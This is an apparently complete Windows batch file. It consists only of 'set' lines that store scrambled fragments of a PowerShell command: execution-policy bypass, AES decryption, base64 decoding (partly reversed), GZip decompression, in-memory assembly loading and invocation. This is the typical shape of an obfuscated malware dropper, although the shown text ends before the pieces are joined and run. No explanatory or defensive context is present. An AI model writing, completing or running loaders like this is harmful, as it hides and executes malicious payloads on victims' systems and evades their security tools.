@echo off
set "ZHeTKbijpa=voBb"
set "syPRiBBzAT=Lm.T"
set "aCTxXHoyjf=.Cry"
set "SCkomnaBtF=comm"
set "DcMrBtyKqN=ode]"
set "wzyzXrkHXj=u.Su"
set "ToPGoVgcDN=e = "
set "DvOMvLCgPg=lBlo"
set "dmMZqKhVAP==');"
set "YxnBZneLkM=, (,"
set "AeCxeZeFMq=);$v"
set "MSJNFPxskB=in $"
set "AGBaVuVthR=gnir"
set "xWhdHUmEVs=.Cry"
set "wlymOhDyZw=16] "
set "ASZFKRhPPY=:('g"
set "fkCZMhMACl=tem."
set "qxdKQGTCKl=-nop"
set "trQIQzZWBM=JXQl"
set "FxZhPBTcMv=n ''"
set "cIcUhNzatS=em.I"
set "ZTgCtTflFo=Disp"
set "OewTPZkbNV=)) {"
set "IqSDBrkbQx='dqR"
set "HWstRInDUw=cB ="
set "zsSEwrxuQA=ert]"
set "qPbgHhAwvK=rt]:"
set "VdQFwsinTw=oin "
set "SUMTplsVWJ=ect "
set "PZqPveVoGw=r = "
set "VqCoIqPxoq=:: '"
set "CpEivGKhTs=1] -"
set "NXZbvtjghl===')"
set "wBdlODJgBa=[IO."
set "InLacxvJcW=[Env"
set "hOoIZmVORG= = ["
set "nOrkQlNBnh=ateD"
set "imBYuNPQfj=File"
set "dwrqtSeMPs=j = "
set "kCSceLerjG=New-"
set "SRxWmCzJhm=g = "
set "OKursZlnAB=raph"
set "zxglzqLWvT=saBm"
set "vZnzIggGHb=voBb"
set "bQMvBqTLCa=ne);"
set "KjSTpExmGc=Disp"
set "uACnzlESNO=JXQl"
set "GxvNoYJCvO=EVb."
set "kCbugHByoj=..-1"
set "GCSOkmEwwC=nage"
set "dJkqDkdhYu= [st"
set "taWEpTGNJv=.Cre"
set "zGltDyTGLd=ypto"
set "SEzRCZkBOL=TllA"
set "GoNbjnlBLK=($gA"
set "lcQDJVreBA=BC;$"
set "gJiMdzBYQA=XLm."
set "epypMSzhfR=Star"
set "ihxvLjtzIP=ZYYc"
set "pMdyOkoNtx=yste"
set "WqRFtNFgrB=join"
set "xrDshtpOQx=xc ="
set "rxpjDToARL=S46e"
set "PvyjjuRdni=esMa"
set "OgkBaMhBHQ=tS46"
set "PhvtCUoyrF=stem"
set "ARAqhcIzGw=();$"
set "suSRxvTshC=nirt"
set "tKSFGUapWG= [Sy"
set "wxudzrTjPz=oArr"
set "iiApqTJUxy=..-1"
set "yRHvYjVYwW=Mode"
set "hgZSAjTndN=$BNP"
set "GfwepGOwIh=EGeD"
set "VzcdLmYIda=bypa"
set "SAEhkDdGmW=y.Pa"
set "CtyyiGPQob=Comp"
set "ezGYdtENXo=embl"
set "jIGuPseHwT=ecry"
set "fMRvlgjxmd=KGKU"
set "NdlHijGbQD=);$l"
set "WkMLEXBqIP=3); "
set "tIKtYgVslt=bjec"
set "JpHzTaUBVZ=em.C"
set "uEtxKcJDiG=oDmj"
set "ZxKzhAhzAf='gni"
set "VALFEvtrEE=oL'["
set "STecLLAfxd=esaB"
set "DURsCdWmWU=se()"
set "VczNxpbkLm=ct S"
set "lBqUDUdWbo=6esa"
set "ddQpPgBjbp=.GZi"
set "XGIwloWcez=br ="
set "TslYPMxNlJ=rtS4"
set "ISRlSqkIVh=();$"
set "YcDhTTBAQy=ewLi"
set "iLoOsVbdRX=br);"
set "lPnWwifRPB=Conv"
set "yiLayMRtTt=]::("
set "exTFqkFGpQ='txe"
set "JZyPtLuqbA=-joi"
set "fwFQaSQRJc=morF"
set "QdKHhTJNhx=vert"
set "tIQycihIQc=fore"
set "mBBZdXZcir=ddin"
set "VEGisnxeWU=tsWi"
set "YGkdDMhylW= = $"
set "xDbcysquSe=Obje"
set "uhEikAfKdy=c.En"
set "NwNFwxlosK=vEVb"
set "xAtJNOEhKC=eam("
set "oroofwSvSK=$ulR"
set "hPumrHZIqP=oint"
set "twHruvPgBC=l.Pa"
set "DfEktVXCTg=brea"
set "aIjhlFaFSE=();$"
set "XQwPtetzTn=]::C"
set "vZMfRegqfY=, $v"
set "LbJinmmXuw=m.IO"
set "wbXImouZMD=e]::"
set "IpCVwtkBqN=ispo"
set "NWDisKeELq=mj.D"
set "ambpqtMFdv=).Sp"
set "sSDseBaIdY=.Con"
set "UPzlAqmfeK=otu "
set "VapIYwhBnG=tion"
set "pBnCYEDrkk=Fo7l"
set "PYgWghzcSs=ptog"
set "TOvUlVyvBQ=join"
set "PvJUaEMsRC=Invo"
set "hrVHbUiBDI=ing("
set "SYKMfCkHwf=.Mod"
set "KXXncUsZoH=] -j"
set "OqaRPOEkgX=('%*'"
set "MaNVtPdsXj=UGTu"
set "ykubrkuxpW=$loD"
set "QMvZKVwlNY=BNPA"
set "jensscgXLK=$GTp"
set "edwHrxKmii=hy.A"
set "gawrAooGiX=);$u"
set "OhdsABUQLI=OyzA"
set "KUqmsZfuPX=XLm "
set "RYjqsUjQNZ=0O+g"
set "LMbGcEWCrf=rity"
set "WyYCqaUZMq=ring"
set "NTrFNxarvH=and "
set "bvhMMiSlkk=7Yiv"
set "yPAJiKuHYs=null"
set "EXfepLtVHk='[-1"
set "IIDdjUsrAl=sion"
set "GwslDjKcJd=mory"
set "ablkxElIQk=oryS"
set "iTrtmnTsVZ=yste"
set "AwtnPTckDT=ke($"
set "DGXezUoGrg=.-16"
set "MsBeftySRq=am;$"
set "HTxsZZeaEE=-Obj"
set "bufVXvoQqU=;$BN"
set "WwhxkiUOhn=X = "
